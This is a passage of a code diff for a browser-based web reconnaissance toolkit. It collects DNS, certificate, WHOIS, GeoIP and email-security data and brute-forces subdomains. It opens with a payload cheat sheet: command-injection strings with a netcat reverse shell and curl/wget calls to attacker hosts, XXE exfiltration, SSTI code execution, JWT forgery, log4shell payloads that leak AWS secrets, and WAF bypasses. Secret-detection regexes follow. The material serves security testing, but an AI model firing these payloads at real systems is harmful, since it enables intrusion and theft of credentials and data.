+["Backticks","`ls`"],
+["Substitution","$(ls)"],
+["Read passwd","; cat /etc/passwd"],
+["whoami backtick","`whoami`"],
+["whoami subst","$(whoami)"],
+["id check","; id"],
+["Outbound curl","; curl http://ATTACKER.com"],
+["Wget one-liner","`wget http://ATTACKER.com/x -O-`"],
+["Ping dnslog","; ping -c 5 attacker.oastify.com"],
+["Reverse shell (nc)","| nc attacker.com 4444 -e /bin/sh"],
+["DNS exfil","; nslookup attacker.oastify.com"],
+["SSRF via cmd","`curl http://169.254.169.254/latest/meta-data/`"],
+["Newline","%0aid"]
+]},
+{cat:"Open Redirect",items:[
+["Double slash","//evil.com"],
+["Protocol in path","/https://evil.com"],
+["URL param","/?url=http://evil.com"],
+["redirect param","/?redirect=//evil.com"],
+["next param","/?next=//attacker.com"],
+["Backslash","/\\evil.com"],
+["Backslash domain","/redirect?to=http://target.com@attacker.com"],
+["CRLF in redirect","/?url=/%0d%0aLocation:%20http://evil.com"],
+["Percent obfuscation","/?url=http://evil.com%2509.com"],
+["Null byte","/?return=http://attacker.com%00target.com"],
+["Ampersand chain","/?url=https://target.com&next=//evil.com"],
+["Backslash slash","/\\evil.com\\"]
+]},
+{cat:"Host Header Injection",items:[
+["Basic host","Host: evil.com"],
+["X-Forwarded-Host","X-Forwarded-Host: evil.com"],
+["X-Originating-Host","X-Originating-Host: evil.com"],
+["X-Rewrite-URL","X-Rewrite-URL: http://evil.com"],
+["X-Forwarded-Server","X-Forwarded-Server: evil.com"],
+["Referer poison","Referer: http://evil.com"],
+["Password reset poison","Host: evil.com + password reset link check"],
+["CRLF in host","Host: evil.com%0d%0aX-Injected: header"]
+]},
+{cat:"CORS Misconfiguration",items:[
+["Null origin","Origin: null"],
+["Attacker origin","Origin: http://evil.com"],
+["Subdomain trick","Origin: http://target.com.evil.com"],
+["Attacker scheme","Origin: https://evil.com"],
+["Scheme confusion","Origin: http://evilhttp://target.com"],
+["Trailing backslash","Origin: http://target.com\\"],
+["Protocol relative","Origin: //evil.com"],
+["Null byte origin","Origin: http://target.com%00evil.com"]
+]},
+{cat:"IDOR / Access Control",items:[
+["Increment user id","/api/user/1 → /api/user/2"],
+["Change objectId in body","{\"id\":\"<victim-id>\"}"],
+["Remove auth header","same request without Authorization"],
+["Method change","GET → PUT / DELETE"],
+["Admin paths","/api/admin, /api/users, /api/orders"],
+["Mass assignment","add \"role\":\"admin\" in body"],
+["Pagination dump","?page=0&limit=10000"],
+["Bulk params","ids[]=1&ids[]=2&ids[]=3"],
+["Old / zero ids","/api/user/0, /api/user/1, /api/user/999999"],
+["Other session token","swap Bearer token of 2nd account"]
+]},
+{cat:"CSRF",items:[
+["Img tag (GET)","<img src=\"https://target.com/admin/delete?id=1\">"],
+["Auto form (POST)","<form id=x action=\"https://target.com/admin\" method=POST><input name=id value=1></form><script>document.forms.x.submit()<\/script>"],
+["Check CSRF token","endpoint bina token ke chale to vulnerable"],
+["Content-Type check","sirf x-www-form-urlencoded accept karta to safe"],
+["Referer/Origin check","kya header validate hota hai"]
+]},
+{cat:"XXE",items:[
+["File read OOB","<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>"],
+["OOB exfil","<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://ATTACKER.com/xxe\">]><foo>&xxe;</foo>"],
+["External param entity","<!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"http://ATTACKER.com/blabla.xml\">%xxe;]>" ],
+["PHP filter via XXE","<!DOCTYPE a [<!ENTITY b SYSTEM \"php://filter/read=convert.base64-encode/resource=index.php\">]><a>&b;</a>"],
+["Billion laughs (DoS)","<!DOCTYPE lolz [<!ENTITY lol \"lol\"><!ENTITY lol2 \"&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;\">]><lolz>&lol2;</lolz>"]
+]},
+{cat:"SSTI",items:[
+["Jinja2 basic","{{7*7}}"],
+["Jinja2 config","{{config}}"],
+["Jinja2 mro","{{self.__class__.__mro__}}"],
+["Velocity","${7*7}"],
+["ERB","<%= 7*7 %>"],
+["Thymeleaf","${7*7}"],
+["Spring SpEL","${T(java.lang.Runtime).getRuntime().exec('id')}"],
+["Jinja2 obfuscate","{{''['__cla''+'ss']}}"],
+["Jinja2 RCE","{{''.__class__.__mro__[1].__subclasses__()}}"],
+["Request environ","{{request.environ}}"]
+]},
+{cat:"CRLF Injection",items:[
+["Cookie inject","%0d%0aSet-Cookie:%20pwned=1"],
+["Location redirect","%0d%0aLocation:%20http://evil.com"],
+["Body inject","%0a%0a<script>alert(1)<\/script>"],
+["Custom header","%0d%0aX-Injected:%20header"],
+["Null byte","%00"],
+["Response splitting","%0d%0a%0d%0a<html>Injected</html>"]
+]},
+{cat:"JWT Attacks",items:[
+["alg none","{\"alg\":\"none\",\"typ\":\"JWT\"}"],
+["HS↔RS confusion","alg RS256 → HS256 with public key as secret"],
+["kid path traversal","kid: ../../dev/null"],
+["kid command injection","kid: $(id)"],
+["Embedded jwk","header: {\"jwk\":{\"kty\":\"oct\",\"k\":\"\"}}"],
+["jku hijack","header: {\"jku\":\"http://ATTACKER.com/jwks.json\"}"],
+["x5u hijack","header: {\"x5u\":\"http://ATTACKER.com/cert.pem\"}"],
+["Far future exp","\"exp\": 4102444800"],
+["Wrong issuer","\"iss\":\"https://attacker.com\""],
+["Weak HS secret","brute: password, 123456, secret, key..."]
+]},
+{cat:"Deserialization",items:[
+["Java JNDI (log4shell)","${jndi:ldap://ATTACKER.com:1389/Exploit}"],
+["Java RMI","${jndi:rmi://ATTACKER.com/Exploit}"],
+["log4shell env exfil","${jndi:dns://ATTACKER.com/${env:AWS_SECRET_ACCESS_KEY}}"],
+["log4shell OS exfil","${jndi:dns://ATTACKER.com/${jndi:ldap://ATTACKER.com/a-${sys:java.version}}}"],
+["PHP serialized object","O:4:\"User\":1:{s:4:\"name\";s:6:\"admin\";}"]
+]},
+{cat:"WAF Bypass / Obfuscation",items:[
+["Double encoding","%2527"],
+["Overlong UTF-8","%C2%A7"],
+["Null byte","%00"],
+["Tab in SQL","%09OR%091=1"],
+["Case variation","sElEcT"],
+["Comment tokens","/**/ → 1/**/UNION/**/SELECT"],
+["Hex encoding","0x27"],
+["Alternate quotes","\\' or \"'"]
+]}
+];
+
+/* ================= tech / waf / secret signatures ================= */
+const TECH=[
+["WordPress",/wp-content|wp-includes|wp-json|wordpress/i],
+["Shopify",/cdn\.shopify\.com|Shopify\.theme|Shopify\./i],
+["Wix",/wixstatic\.com|Wix\./i],
+["Squarespace",/squarespace/i],
+["Magento",/magento|skin\/frontend/i],
+["Joomla",/joomla/i],
+["Drupal",/drupal/i],
+["Next.js",/_next\/static|__NEXT_DATA__/i],
+["Nuxt",/_nuxt\/|__nuxt/i],
+["React",/react(-|_)?(dom|production|development)|__REACT|react\.js/i],
+["Vue",/__vue|vue[.-]js|vue[\/.-][0-9]/i],
+["Angular",/ng-version|angular[\/.-]|ng-app/i],
+["jQuery",/jquery[\/.-]/i],
+["Bootstrap",/bootstrap[\/.-]/i],
+["Tailwind",/tailwind/i],
+["Django",/csrfmiddlewaretoken|django/i],
+["Flask",/Flask/i],
+["Laravel",/laravel|XSRF-TOKEN|laravel_session/i],
+["PHP",/\.php[?\s\"']|PHPSESSID|PHP\//i],
+["ASP.NET",/__VIEWSTATE|\.aspx|ASP\.NET|FormsAuth/i],
+["JSP",/\.jsp|JSESSIONID/i],
+["Ruby on Rails",/authenticity_token|_rails/i],
+["Spring",/x-application-context|spring|actuator/i],
+["Node/Express",/node_modules|express/i],
+["nginx",/nginx/i],
+["Apache",/apache/i],
+["Cloudflare",/cloudflare|cf-ray|__cf/i],
+["AWS",/awselb|amazonaws/i],
+["Akamai",/akamai|akam/i],
+["Fastly",/fastly/i],
+["Vercel",/x-vercel|vercel/i],
+["Netlify",/netlify|x-nf-/i],
+["Heroku",/heroku/i],
+["Firebase",/firebase/i],
+["PayPal",/paypal/i],
+["Stripe",/stripe/i],
+["reCAPTCHA",/grecaptcha|recaptcha/i],
+["Google Tag Manager",/googletagmanager|gtag\(|dataLayer/i],
+["Google Analytics",/google-analytics|UA-\d|G-[A-Z0-9]{6,}/i],
+["Facebook Pixel",/fbq\(|facebook\.com\/tr/i],
+["Hotjar",/hotjar/i],
+["Segment",/segment\.io|analytics\.js/i]
+];
+const WAFT=[
+["Cloudflare",/cloudflare|cf-ray/i],
+["AWS WAF",/Sorry, you have been blocked|blocked by AWS/i],
+["Akamai",/akamai|akam/i],
+["Sucuri",/sucuri/i],
+["Imperva/Incapsula",/imperva|incapsula|_Incapsula/i],
+["F5 BIG-IP",/F5|BIG-IP/i],
+["DataDome",/datadome/i],
+["Kasada",/kasada/i]
+];
+const SECRETS=[
+["AWS Access Key",/AKIA[0-9A-Z]{16}/g],
+["Private Key Block",/-----BEGIN [A-Z ]*PRIVATE KEY-----/g],
+["GitHub Token",/(?:ghp|gho|ghu|ghs|ghr)_[A-Za-z0-9]{36}|github_pat_[A-Za-z0-9_]{22,}/g],
+["Slack Token",/xox[baprs]-[A-Za-z0-9-]{10,}/g],
+["Google API Key",/AIza[0-9A-Za-z\-_]{35}/g],
+["Mailgun Key",/key-[a-z0-9]{32}/g],
+["SendGrid Key",/SG\.[A-Za-z0-9_-]{16,}\.[A-Za-z0-9_-]{16,}/g],
+["Stripe Live Key",/(?:sk|rk)_live_[A-Za-z0-9]{16,}/g],
+["Mongo URI",/mongodb(?:\+srv)?:\/\/[^\s\"'<>]{6,}/g],
+["MySQL URI",/mysql:\/\/[^\s\"'<>]{6,}/g],
+["Postgres URI",/postgres(?:ql)?:\/\/[^\s\"'<>]{6,}/g],
+["Redis URI",/redis:\/\/[^\s\"'<>]{6,}/g],
+["Password Assign",/password["'\s:=]{1,5}["'][^"'\s]{4,40}["']/gi],
+["API Key Assign",/api[_-]?key["'\s:=]{1,5}["'][A-Za-z0-9_\-]{16,64}["']/gi],
+["Secret Assign",/secret["'\s:=]{1,5}["'][A-Za-z0-9_\-]{16,64}["']/gi],
+["JWT in source",/eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}/g],
+["Basic Auth blob",/Basic [A-Za-z0-9+\/=]{16,}/g]
+];
+/* ================= state / history ================= */
+const LS_H="reconkit_history", LS_P="reconkit_proxy";
+const state={domain:"",recon:null,site:null,subs:[],subsMerged:new Map()};
+function loadHist(){try{return JSON.parse(localStorage.getItem(LS_H)||"[]")}catch(e){return[]}}
+function saveHist(h){try{localStorage.setItem(LS_H,JSON.stringify(h))}catch(e){}}
+function loadData(id){try{return JSON.parse(localStorage.getItem("reconkit_data_"+id))}catch(e){return null}}
+function addHistory(kind,domain,data){
+  const h=loadHist();const id=Date.now().toString(36)+Math.random().toString(36).slice(2,6);
+  h.unshift({id,kind,domain,ts:Date.now()});
+  h=h.slice(0,60);saveHist(h);
+  try{localStorage.setItem("reconkit_data_"+id,JSON.stringify(data))}catch(e){}
+  renderHistory();return id;
+}
+
+/* ================= network core ================= */
+async function fetchJson(url,ms,opts){
+  ms=ms||15000;
+  const c=new AbortController();const t=setTimeout(()=>c.abort(),ms);
+  try{
+    const r=await fetch(url,Object.assign({signal:c.signal},opts||{}));
+    if(!r.ok)throw new Error("HTTP "+r.status);
+    return await r.json();
+  }finally{clearTimeout(t);}
+}
+async function dnsResolve(name,type){
+  try{
+    const j=await fetchJson("https://dns.google/resolve?name="+encodeURIComponent(name)+"&type="+type,12000);
+    return (j.Answer||[]).map(a=>String(a.data).replace(/^"|"$/g,""));
+  }catch(e){
+    const j=await fetchJson("https://cloudflare-dns.com/dns-query?name="+encodeURIComponent(name)+"&type="+type,12000,{headers:{accept:"application/dns-json"}});
+    return (j.Answer||[]).map(a=>String(a.data).replace(/^"|"$/g,""));
+  }
+}
+const PROXIES=[
+  u=>"https://api.allorigins.win/raw?url="+encodeURIComponent(u),
+  u=>"https://corsproxy.io/?url="+encodeURIComponent(u),
+  u=>"https://api.codetabs.com/v1/proxy?quest="+encodeURIComponent(u)
+];
+async function proxyBody(url,ms,signal){
+  ms=ms||18000;let last=null;
+  for(const f of PROXIES){
+    try{
+      const r=await fetch(f(url),{signal});
+      const text=await r.text();
+      if(r.ok&&text.length)return{status:r.status,text:text.slice(0,400000)};
+      last=new Error("proxy HTTP "+r.status);
+    }catch(e){last=e;}
+  }
+  throw last||new Error("all proxies failed");
+}
+function customProxyUrl(u){
+  const cp=($("#custom-proxy")?$("#custom-proxy").value:"").trim();
+  if(!cp)return null;
+  if(cp.indexOf("{url}")>=0)return cp.replace("{url}",encodeURIComponent(u));
+  return cp.replace(/\/+$/,"")+"/"+encodeURIComponent(u);
+}
+async function smartFetch(url,signal){
+  try{
+    const c=new AbortController();const t=setTimeout(()=>c.abort(),12000);
+    if(signal)signal.addEventListener("abort",()=>c.abort());
+    const r=await fetch(url,{signal:c.signal,redirect:"follow",referrerPolicy:"no-referrer"});
+    clearTimeout(t);
+    const text=await r.text();
+    return{status:r.status,text:text.slice(0,400000),headers:[...r.headers.entries()],native:true,proxy:"native"};
+  }catch(e){/* fall through */}
+  const cp=customProxyUrl(url);
+  if(cp){
+    try{
+      const c=new AbortController();const t=setTimeout(()=>c.abort(),25000);
+      if(signal)signal.addEventListener("abort",()=>c.abort());
+      const r=await fetch(cp,{signal:c.signal});
+      clearTimeout(t);
+      const text=await r.text();
+      return{status:r.status,text:text.slice(0,400000),headers:[...r.headers.entries()],native:false,proxy:"custom"};
+    }catch(e){/* fall through */}
+  }
+  const p=await proxyBody(url,18000,signal);
+  return{status:p.status,text:p.text,headers:null,native:false,proxy:"public"};
+}
+async function geoip(ip){
+  try{
+    const j=await fetchJson("https://ip-api.com/json/"+ip+"?fields=status,message,country,regionName,city,isp,org,as,query",9000);
+    if(j.status==="success")return j;
+    throw new Error(j.message||"ip-api error");
+  }catch(e){
+    try{
+      const j=await fetchJson("https://ipinfo.io/"+ip+"/json",9000);
+      return{isp:j.org,org:j.org,country:j.country,city:j.city,regionName:j.region};
+    }catch(e2){
+      const j=await fetchJson("https://ipapi.co/"+ip+"/json/",9000);
+      return{isp:j.org,org:j.org,country:j.country_name,city:j.city,regionName:j.region};
+    }
+  }
+}
+async function cymru(ip,suffix){
+  const rev=ip.split(".").reverse().join(".");
+  const data=await dnsResolve(rev+"."+suffix,"TXT");
+  if(!data||!data.length)return null;
+  return data[0];
+}
+async function rdapLookup(domain){
+  try{return await fetchJson("https://rdap.org/domain/"+encodeURIComponent(domain),15000);}catch(e){}
+  try{
+    const bs=await fetchJson("https://data.iana.org/rdap/dns.json",15000);
+    const parts=domain.split(".");
+    for(let i=parts.length-1;i>=1;i--){
+      const tld=parts.slice(i).join(".");
+      const svc=(bs.TLDs&&bs.TLDs[tld]||[]).find(s=>s.RDAPServers&&s.RDAPServers.length);
+      if(svc){
+        const base=svc.RDAPServers[0].BaseURL.replace(/\/$/,"");
+        try{return await fetchJson(base+"/domain/"+encodeURIComponent(domain),15000);}catch(e2){}
+      }
+    }
+  }catch(e){}
+  throw new Error("RDAP lookup failed");
+}
+function vcardProp(vc,prop){
+  const row=(vc||[]).find(r=>r&&r[0]===prop);
+  return row?row[3]:null;
+}
+function rdapParse(r){
+  const out={};
+  const ev=r.events||[];
+  out.created=(ev.find(e=>/registr/i.test(e.eventAction))||{}).eventDate;
+  out.updated=(ev.find(e=>/last changed|updated/i.test(e.eventAction))||{}).eventDate;
+  out.expires=(ev.find(e=>/expir|redem|renew/i.test(e.eventAction))||{}).eventDate;
+  out.status=r.status||[];
+  out.nameservers=[...new Set((r.nameservers||[]).map(n=>n.ldhName).filter(Boolean))];
+  const reg=(r.entities||[]).find(e=>(e.roles||[]).indexOf("registrar")>=0);
+  if(reg){
+    out.registrar=reg.vcardArray?vcardProp(reg.vcardArray,"fn"):(reg.handle||"");
+    const c=reg.vcardArray?vcardProp(reg.vcardArray,"adr"):null;
+    if(c&&c.length>5)out.country=c[5];
+  }
+  return out;
+}
+function rdapExpiryOk(r){
+  if(!r)return false;
+  const e=(r.events||[]).find(e=>/expir|redem|renew/i.test(e.eventAction));
+  if(!e)return false;
+  return (new Date(e.eventDate).getTime()-Date.now())>30*86400000;
+}
+
+/* ================= RECON 360 ================= */
+async function runRecon(){
+  const d=normDom($("#main-domain").value);
+  if(!d||!/^[a-z0-9.-]+\.[a-z]{2,}$/.test(d)){toast("Valid domain daalo, e.g. example.com",true);return;}
+  state.domain=d;
+  const st=$("#recon-status"),btn=$("#btn-recon");
+  btn.disabled=true;
+  const R={domain:d,ts:Date.now(),dns:{},ips:[],rdap:null,ct:[],wayback:null,checks:[],errors:[]};
+  try{
+    statusEl(st,"[1/6] Resolving DNS records (A, AAAA, MX, NS, TXT, SOA, CAA, CNAME)…");
+    setProgress("#recon-prog",5);
+    const types=["A","AAAA","MX","NS","TXT","SOA","CAA","CNAME"];
+    await Promise.all(types.map(async t=>{
+      try{
+        const recs=await dnsResolve(d,t);
+        if(recs.length)R.dns[t]=recs;
+      }catch(e){R.errors.push("DNS "+t+": "+e.message);}
+    }));
+    setProgress("#recon-prog",15);
+
+    statusEl(st,"[2/6] Certificate Transparency (crt.sh) — thoda time lag sakta hai (10-30s)…");
+    try{
+      const j=await fetchJson("https://crt.sh/?q=%25."+encodeURIComponent(d)+"&output=json",30000);
+      const seen=new Set();
+      (j||[]).forEach(x=>{
+        (x.name_list||"").split("\n").forEach(n=>{
+          n=n.trim().toLowerCase().replace(/^\*\./,"");
+          if(n===d||n.endsWith("."+d)){
+            if(!seen.has(n)){
+              seen.add(n);
+              R.ct.push({name:n,issuer:x.issuer_name||"",nb:x.not_before||"",na:x.not_after||""});
+            }
+          }
+        });
+      });
+      R.ct.sort((a,b)=>a.name.localeCompare(b.name));
+    }catch(e){R.errors.push("crt.sh: "+e.message);}
+    setProgress("#recon-prog",40);
+
+    statusEl(st,"[3/6] IP intelligence — geo, ASN (Cymru/Ripestat)…");
+    const ips=[...new Set((R.dns.A||[]).filter(x=>x.indexOf(":")<0))].slice(0,6);
+    await Promise.all(ips.map(async ip=>{
+      const info={ip,geo:null,asn:null,cidr:null,ripe:null};
+      try{info.geo=await geoip(ip);}catch(e){}
+      try{const a=await cymru(ip,"origin.asn.cymru.com");if(a)info.asn=a.replace(/\|/g," · ");}catch(e){}
+      try{
+        const c=await cymru(ip,"cymru.com");
+        if(c){const p=c.split("|");info.cidr=p[0]||null;if(!info.asn&&p[1])info.asn="AS"+p[1];}
+      }catch(e){}
+      try{
+        const j=await fetchJson("https://stat.ripe.net/data/networks-by-address/data.json?resource="+ip,9000);
+        const dd=j.data;
+        if(dd){
+          info.ripe=dd.description||null;
+          if(!info.asn&&(dd.asns||[]).length)info.asn="AS"+dd.asns[0].asn+(dd.asns[0].description?" "+dd.asns[0].description:"");
+        }
+      }catch(e){}
+      R.ips.push(info);
+    }));
+    setProgress("#recon-prog",60);
+
+    statusEl(st,"[4/6] WHOIS (RDAP)…");
+    try{R.rdap=await rdapLookup(d);}catch(e){R.errors.push("RDAP/WHOIS: "+e.message);}
+    setProgress("#recon-prog",70);
+
+    statusEl(st,"[5/6] Email security — SPF, DMARC, DKIM, MTA-STS, TLS-RPT…");
+    R.spf=(R.dns.TXT||[]).find(t=>/^\s*v=spf1/i.test(t))||null;
+    try{const dm=await dnsResolve("_dmarc."+d,"TXT");R.dmarc=dm.length?dm[0]:null;}catch(e){}
+    try{const mt=await dnsResolve("_mta-sts."+d,"TXT");R.mtaSts=mt.length?mt[0]:null;}catch(e){}
+    try{const tl=await dnsResolve("_smtp._tls."+d,"TXT");R.tlsrpt=tl.length?tl[0]:null;}catch(e){}
+    R.dkim={};
+    await Promise.all(DKIM_SELECTORS.map(async s=>{
+      try{const v=await dnsResolve(s+"._domainkey."+d,"TXT");if(v.length)R.dkim[s]=v[0];}catch(e){}
+    }));
+    setProgress("#recon-prog",85);
+
+    statusEl(st,"[6/6] Wayback Machine history…");
+    try{
+      const url="https://web.archive.org/cdx/search/cdx?url="+encodeURIComponent(d)+"/*&output=json&limit=400&collapse=urlkey&fl=original,timestamp,statuscode";
+      const j=await fetchJson(url,25000);
+      const rows=Array.isArray(j)?j.slice(1):[];
+      R.wayback={
+        total:rows.length,
+        oldest:rows.length?rows[0][1]:null,
+        newest:rows.length?rows[rows.length-1][1]:null,
+        sample:rows.slice(0,30).map(r=>r[0])
+      };
+    }catch(e){R.errors.push("Wayback: "+e.message);}
+    setProgress("#recon-prog",95);
+
+    const chk=(label,ok,pts)=>R.checks.push({label,ok:!!ok,pts});
+    chk("A record resolves",R.dns.A&&R.dns.A.length,10);
+    chk("SPF record",R.spf,15);
+    chk("DMARC record",R.dmarc,20);
+    chk("DMARC policy ≥ quarantine",R.dmarc&&/p=(quarantine|reject)/i.test(R.dmarc),10);
+    chk("MTA-STS",R.mtaSts,10);
+    chk("TLS-RPT",R.tlsrpt,5);
+    chk("CAA record",R.dns.CAA&&R.dns.CAA.length,10);
+    chk("RDAP: domain active",R.rdap,10);
+    chk("RDAP: expiry > 30 days",rdapExpiryOk(R.rdap),10);
+    R.score=R.checks.reduce((s,c)=>s+(c.ok?c.pts:0),0);
+
+    state.recon=R;
+    renderRecon(R);
+    addHistory("recon",d,R);
+    statusEl(st,"✅ Recon complete for "+d+" — score "+R.score+"/100. Quick-links se aur digi.");
+  }catch(e){
+    statusEl(st,"⚠ Recon me error: "+e.message);
+    R.errors.push("fatal: "+e.message);
+    state.recon=R;
+    renderRecon(R);
+  }
+  btn.disabled=false;
+  hideProgress("#recon-prog");
+}
+
+/* ================= recon rendering ================= */
+function dnsTable(dns){
+  const order=["A","AAAA","CNAME","MX","NS","TXT","SOA","CAA"];
+  let rows="";
+  for(const t of order){
+    const recs=dns[t];
+    rows+="<tr><td><b>"+t+"</b></td><td>"+(recs&&recs.length?recs.map(esc).join("<br>"):'<span class="hint">—</span>')+"</td></tr>";
+  }
+  return "<table><tr><th>Type</th><th>Records</th></tr>"+rows+"</table>";
+}
+function ipTable(ips){
+  if(!ips.length)return '<span class="hint">Koi A record nahi mila (ya lookup fail hua).</span>';
+  let rows="";
+  for(const i of ips){
+    const geo=[i.geo&&i.geo.country,i.geo&&i.geo.city,i.geo&&i.geo.isp].filter(Boolean).join(" · ");
+    rows+="<tr><td><b>"+esc(i.ip)+"</b></td><td>"+esc(geo||"—")+"</td><td>"+esc(i.asn||"—")+"</td><td>"+esc((i.cidr||"—")+(i.ripe?" <span class='hint'>("+i.ripe+")</span>":""))+"</td></tr>";
+  }
+  return "<table><tr><th>IP</th><th>Geo / ISP</th><th>ASN</th><th>CIDR</th></tr>"+rows+"</table>";
+}
+function rdapHtml(r){
+  if(!r)return '<span class="hint">RDAP lookup fail — is TLD ke liye registry JSON nahi de rahi. Quick-links me ViewDNS/WhoXY se manual WHOIS dekh sakte ho.</span>';
+  const p=rdapParse(r);
+  let expBadge="";
+  if(p.expires){
+    const days=Math.floor((new Date(p.expires).getTime()-Date.now())/86400000);
+    expBadge=days<60?' <span class="chip bad">⚠ '+days+"d bache</span>":' <span class="chip ok">'+days+"d left</span>";
+  }
+  return kv([
+    ["Registrar",esc(p.registrar||"—")],
+    ["Country",esc(p.country||"—")],
+    ["Created",esc(p.created||"—")],
+    ["Updated",esc(p.updated||"—")],
+    ["Expires",esc(p.expires||"—")+expBadge],
+    ["Nameservers",(p.nameservers||[]).map(esc).join(", ")||"—"],
+    ["Status",((p.status||[]).slice(0,6).map(esc).join(", "))||"—"]
+  ]);
+}
+function emailSecHtml(R){
+  const dkim=Object.keys(R.dkim||{});
+  return kv([
+    ["SPF",R.spf?chip(R.spf.slice(0,90),"ok"):chip("missing","bad")],
+    ["DMARC",R.dmarc?chip(R.dmarc.slice(0,90),"ok"):chip("missing","bad")],
+    ["MTA-STS",R.mtaSts?chip(R.mtaSts,"ok"):chip("missing")],
+    ["TLS-RPT",R.tlsrpt?chip(R.tlsrpt,"ok"):chip("missing")],
+    ["DKIM selectors",dkim.length?dkim.map(s=>chip(s)).join(" "):chip("common selectors me nahi mila")],
+    ["CAA",R.dns&&R.dns.CAA&&R.dns.CAA.length?R.dns.CAA.map(c=>chip(c)).join(" "):chip("missing")]
+  ]);
+}
+function ctTable(ct){
+  if(!ct.length)return '<span class="hint">crt.sh se kuch nahi mila.</span>';
+  const rows=ct.slice(0,150).map(c=>"<tr><td>"+esc(c.name)+"</td><td>"+esc(String(c.issuer).slice(0,42))+"</td><td>"+esc(c.na)+"</td></tr>").join("");
+  return '<div style="max-height:360px;overflow:auto"><table><tr><th>Name</th><th>Issuer</th><th>Not After</th></tr>'+rows+"</table></div>"+(ct.length>150?'<div class="hint">…+'+(ct.length-150)+" aur (Subdomains tab me brute karke dekho)</div>":"");
+}
+function waybackHtml(w){
+  if(!w)return '<span class="hint">Wayback data nahi mila.</span>';
+  return kv([
+    ["Captures (sampled)",String(w.total)],
+    ["Oldest",esc(w.oldest||"—")],
+    ["Newest",esc(w.newest||"—")]
+  ])+(w.sample.length?'<details style="margin-top:8px"><summary>Sample URLs ('+w.sample.length+')</summary><pre>'+esc(w.sample.join("\n"))+"</pre></details>":"");
+}
+function checksHtml(checks,score){
+  const rows=(checks||[]).map(c=>'<div class="check-row"><span>'+esc(c.label)+'</span><span class="'+(c.ok?"ok":"fail")+'">'+(c.ok?"✓ "+c.pts+" pts":"✗ 0 pts")+"</span></div>").join("");
+  return '<div class="row" style="align-items:center;gap:16px"><div class="score '+(score>=70?"good":score>=40?"mid":"bad")+'">'+score+'<span style="font-size:14px;color:var(--muted)">/100</span></div><div style="flex:1">'+rows+"</div></div>";
+}
+function quickLinks(d){
+  const QL=[
+    ["dnsdumpster","https://dnsdumpster.com/"],
+    ["urlscan.io","https://urlscan.io/search/#domain:"+d],
+    ["crt.sh","https://crt.sh/?q=%25."+d],
+    ["SecurityTrails","https://securitytrails.com/domain/"+d],
+    ["Netcraft","https://searchdns.netcraft.com/?search_for="+d],
+    ["Shodan","https://www.shodan.io/search?query=%22"+d+"%22"],
+    ["VirusTotal","https://www.virustotal.com/gui/domain/"+d],
+    ["ViewDNS whois","https://viewdns.info/whois/?domain="+d],
+    ["Wayback","https://web.archive.org/web/*/"+d],
+    ["bgp.he.net","https://bgp.he.net/Domain/"+d],
+    ["RapidDNS","https://rapiddns.io/subdomain/"+d+"?full=1"],
+    ["ZoomEye","https://www.zoomeye.org/search.html?q="+d]
+  ];
+  return "<div>"+QL.map(l=>'<a class="chip" target="_blank" rel="noopener" href="'+l[1]+'">'+l[0]+" ↗</a>").join("")+"</div>";
+}
+function renderRecon(R){
+  const el=$("#recon-out");
+  let g="";
+  g+=card("🏷 Domain & Time","<b>"+esc(R.domain)+"</b><div class='hint'>"+new Date(R.ts).toLocaleString()+"</div>");
+  g+=card(" Security Checklist",checksHtml(R.checks,R.score||0));
+  g+=card("🌐 DNS Records",dnsTable(R.dns));
+  g+=card("📡 IPs & Network",ipTable(R.ips));
+  g+=card("📇 WHOIS (RDAP)",rdapHtml(R.rdap));
+  g+=card("📧 Email Security",emailSecHtml(R));
+  g+=card("🔎 Subdomains (CT — crt.sh)","<div class='hint' style='margin-bottom:8px'>"+R.ct.length+" unique names</div>"+ctTable(R.ct));
+  g+=card("🕰 Wayback History",waybackHtml(R.wayback));
+  g+=card("🔗 Quick Recon Links",quickLinks(R.domain));
+  if(R.errors.length)g+=card("⚠ Errors / Warnings","<pre>"+esc(R.errors.join("\n"))+"</pre>");
+  el.innerHTML='<div class="grid">'+g+"</div>";
+}
+/* ================= SUBDOMAINS ================= */
+async function runBrute(){
+  const d=normDom($("#sub-domain").value);
+  if(!d||!/^[a-z0-9.-]+\.[a-z]{2,}$/.test(d)){toast("Valid domain daalo",true);return;}
+  state.domain=d;
+  const words=$("#wordlist").value.split(/[\s,]+/).filter(Boolean);
+  const btn=$("#btn-brute"),st=$("#subs-status");
+  btn.disabled=true;
+  statusEl(st,"Bruting "+words.length+" subdomains via DoH…");
+  setProgress("#subs-prog",2);
+  const res={};const q=[...words];let done=0;
+  const worker=async()=>{
+    while(q.length){
+      const w=q.shift();if(!w)break;
+      const h=w+"."+d;
+      try{const a=await dnsResolve(h,"A");res[h]=a;}catch(e){res[h]="ERR";}
+      done++;
+      if(done%20===0){setProgress("#subs-prog",done/words.length*90);statusEl(st,"Bruting… "+done+"/"+words.length);}
+      await sleep(10);
+    }
+  };
+  try{
+    await Promise.all(Array.from({length:8},worker));
+  }catch(e){statusEl(st,"⚠ "+e.message);}
+  const merged=new Map();
+  const ctCount=(state.recon&&state.recon.domain===d)?state.recon.ct.length:0;
+  if(state.recon&&state.recon.domain===d)state.recon.ct.forEach(c=>merged.set(c.name,{a:null,ct:true,live:"",server:""}));
+  Object.keys(res).forEach(h=>{
+    const m=merged.get(h)||{ct:false,live:"",server:""};
+    m.a=res[h];
+    merged.set(h,m);
+  });
+  state.subsMerged=merged;
+  state.subs=[...merged.keys()].sort();
+  renderSubs(merged);
+  setProgress("#subs-prog",95);
+  statusEl(st,"✅ "+state.subs.length+" unique subdomains (CT "+ctCount+" + brute).");
+  if($("#sub-live").checked&&state.subs.length){
+    const liveList=state.subs.slice(0,30);
+    for(const h of liveList){
+      try{
+        const r=await smartFetch("https://"+h);
+        const m=merged.get(h);
+        if(m){m.live=r.status;m.server=((r.headers||[]).find(x=>x[0].toLowerCase()==="server")||[])[1]||"";renderSubs(merged);}
+      }catch(e){
+        const m=merged.get(h);
+        if(m){m.live="ERR";renderSubs(merged);}
+      }
+      statusEl(st,"Live-checking… "+liveList.indexOf(h)+1+"/"+liveList.length);
+    }
+  }
+  statusEl(st,"✅ Done. "+state.subs.length+" unique subdomains. CSV export ready.");
